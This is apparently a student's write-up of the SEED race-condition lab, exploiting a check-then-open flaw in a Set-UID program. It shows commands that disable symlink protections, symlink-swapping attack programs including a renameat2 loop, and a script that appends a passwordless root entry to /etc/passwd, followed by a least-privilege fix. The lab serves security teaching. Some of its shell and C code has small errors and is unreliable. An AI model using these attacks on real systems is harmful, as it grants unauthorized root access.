# Race Condition Vulnerability Lab
- a race condition occurs when multiple processes access and manipulate the same data concurrently, and the outcome of the execution depends on the particular order in which the access takes place
- If a privileged program has a race-condition vulnerability, attackers can run a parallel process to "race" against the privileged program, with an intention to change the behaviors of the program
- topics:
    - race condition
    - sticky symlink protection
    - principle of least privilege

## Environment Setup
- Turn off countermeasures
    - Ubuntu has a built-in protection that restricts who can follow a symlink, symlinks in world-writable sticky directories (e.g., `/tmp`) cannot be followed if the follower and directory owner do not match the symlink owner
        - `$ sudo sysctl -w fs.protected_symlinks=0`
    - Ubuntu 20.04 introduces another security mechanism that prevents the root form writing files in `/tmp` that are owned by others
        - `$ sudo sysctl fs.protected_regular=0`

## Task 1: Choosing Our Target
- the entry for `root` in `/etc/passwd`: `root:x:0:0:root:/root:/bin/bash`
- a general entry contains 7 fields
    - `username:password:uid:gid:user_info:home_directory:login_shell`
    - the `password` field used to contain an encrypted password, now password hashes will be stored in a separate file `/etc/shadow` (in this case, this field will be `x`)
- it is more difficult to exploit race condition to append to both `/etc/passwd` and `/etc/shadow`, instead, we can put password in the second field (`x`) of an entry in `/etc/passwd` 
- the magic value in Ubuntu live CD for a passowrd-less account: `U6aMy0wojraho`, if we put this value in the password field of a user entry, we only need to hit the return key when prompted for a password
- test
    - append `test:U6aMy0wojraho:0:0:test:/root:/bin/bash` to `/etc/passwd`
        ```
        seed@...$ su test
        Password: (Press Enter)
        root@...#
        ```

## Task 2: Launching the Race Condition Attack
- goal: exploit race condition vulnerability in a vulnerable `Set-UID` program `vulp.c`, and the ultimate goal is to get root privilege, the critical step is to make `/tmp/XYZ` point to the `/etc/passwd` within the window between check (`access(fn, W_OK)`) and use (`fopen(fn, "a+")`)

### Task 2.A: Simulating a Slow Machine
- add `sleep(10)` between `access()` and `fopen()`
- invoke `vulp`
    ```
    $ ./vulp
    test:U6aMy0wojraho:0:0:test:/root:/bin/bash
    ```
- create symlink after enter the content to `vulp`
    ```
    $ ln -sf /etc/passwd /tmp/XYZ
    (after vulp finishes executing)
    $ su test
    Password: (Press Enter)
    # whoami
    root
    ```

### Task 2.B: The Real Attack
- remove `sleep()`
- typicall strategy is to run an attack program in parallel, perfect timing is very hard to achieve
- write the attack program in C:
    - `symlink("/etc/passwd", "/tmp/XYZ");`
    - `unlink("/tmp/XYZ");`
- automatically running `vulp` and detecting whether the attack is successful by monitoring whether `/etc/passwd` changes with a script
    ```
    #!/bin/bash

    CHECK_FILE="ls -l /etc/passwd"
    old=$($CHECK_FILE)
    new=$($CHECK_FILE)
    while ["$old"=="$new"]
    do
        echo "test:U6aMy0wojraho:0:0:test:/root:/bin/bash" | ./vulp
        new=$(CHECK_FILE)
    done
    echo "STOP... The passwd file has been changed"
    ```
- the core code of our target program `atk.c`
    ```
    while(1) {
        symlink("/etc/passwd", "/tmp/XYZ");
        unlink("/tmp/XYZ");
        symlink("/etc/passwd", "/tmp/XXX");
        unlink("/tmp/XYZ");
    }
    ```
- **attack succeeded**: we run our attack program, repeatedly link `/tmp/XYZ` to `/etc/passwd` and a `seed` owned file `/tmp/XXX`, and then run `target_process.sh`
    ```
    $ gcc -o atk atk.c
    $ ./atk
    ```
    ```
    $ ./target_process.sh
    Permission denied
    Permission denied
    Permission denied
    Permission denied
    Permission denied
    STOP... The passwd file has been changed
    $ su test
    Password:
    #
    ```

- **attack failed**: in most cases, after a few loops, the owner of `/tmp/XYZ` becomes `root`, and the attack will not success, to imporve the chance to success, each time this happens, we should manually delete `/tmp/XYZ`
    ```
    $ ls -l /tmp/XYZ
    -rw-rw-r-- 1 root seed 0 Jan 30 23:45 /tmp/XYZ
    ```
    - I run `atk` many times, and find that in most cases the attack fails within several seconds, which means that the time window between `unlink` and `symlink` is quite large, write a script to directly run 2 commands `ln -sf /etc/passwd /tmp/XYZ` and `ln -sf /tmp/XXX /tmp/XYZ` to reduce the time window between link and unlink, and the chance of success improved

### Task 2.C: An Improved Attack
- when the owner of `/tmp/XYZ` becomes `root`, our attack program can never remove or `unlink()` it, because the `/tmp` folder has a "sticky" bit on, meaning that only the owner of the file can delete the file, even though the folder is world-writable
- the reason for this problem is that out attack program itself has a race condition vulnerability, the attack program is context switched out right after `unlink()`, but before it links the name to another file (`symlink()`), and the target `Set-UID` program gets a change to run `fopen(fn, "a+")`, it creates a new file with `root` being the owner

- In task `2.B`, I used `atk.sh` to reduce the possibility that the race condition between `unlink` and `link` happens, but it still exists, actually, there is a way to make `unlink` and `link` atomic in C
    - `renameat2()` allows us to atomically switch 2 symlinks
    - usage: `renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", RENAME_EXCHANGE)`
- improved attack code `imp_atk.c`
    ```
    #define _GNU_SOURCE

    #include <unistd.h>
    #include <stdio.h>
    int main() {
        unlink("/tmp/XYZ");
        unlink("/tmp/ABC");
        symlink("/etc/passwd", "/tmp/XYZ");
        symlink("/tmp/XXX"   , "/tmp/ABC");
        while(1) {
            // exchange 2 symlinks atomically
            renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", RENAME_EXCHANGE);
        }
        return 0;
    }
    ```
- test: in most cases, the attack succeed in seconds
    ```
    $ gcc -o imp_atk imp_atk.c
    $ ./imp_atk
    ```
    ```
    $ ./target_process.sh
    Permission denied
    Permission denied
    STOP... The passwd file has been changed
    $ su test
    Password:
    #
    ```

## Task 3: Countermeasures
### Task 3.A: Principle of least privilege
- the fundamental problem in this lab is the violation of the *Principle of Least Privilege*, using `access()` to limit the user's power is not a proper way, instead we can use `setuid()` system call to temporarily disable the root privilege, and later enable it when necessary
- to make it easier to check whether our fix works, we first remove the `access()`, and try open a file directly, if we set a symlink from `/tmp/XYZ` to `/etc/passwd` and make `test` a `Set-UID` root program, it can append the input to `/etc/passwd`
    ```
    ...
    fp = fopen(fn, "a+");
    if(!fp) {
        perror("Open failed");
        exit(1);
    }
    ...
    ```
- now, we use `setuid` to revoke its root privilege, for convenient, add `system("/bin/id")` after setting the euid to check whether it works
    ```
    setuid(getuid()); // temporarily set effective uid to real uid
    system("/bin/id");
    fp = fopen(fn, "a+");
    // write to fp here
    ...
    seteuid(0); // try to regain root privilege, but won't success
    system("/bin/id");
    ```
- test
    ```
    $ gcc -o fixed_vulp fixed_vulp.c 
    $ sudo chown root fixed_vulp
    $ sudo chmod 4755 fixed_vulp

    $ ln -sf /etc/passwd /tmp/XYZ
    $ ./fixed_vulp 
    1
    uid=1000(seed) gid=1000(seed) groups=1000(seed), ...
    Open failed: Permission denied    <--- failed to open /etc/passwd

    $ ln -sf /tmp/XXX /tmp/XYZ
    $ ./fixed_vulp 
    1
    uid=1000(seed) gid=1000(seed) groups=1000(seed), ...
    uid=1000(seed) gid=1000(seed) groups=1000(seed), ... <--- seteuid(0) failed, because a program without root privilege cannot make itself a Set-UID root program
    ```

### Task 3.B: Using Ubuntu's built-in scheme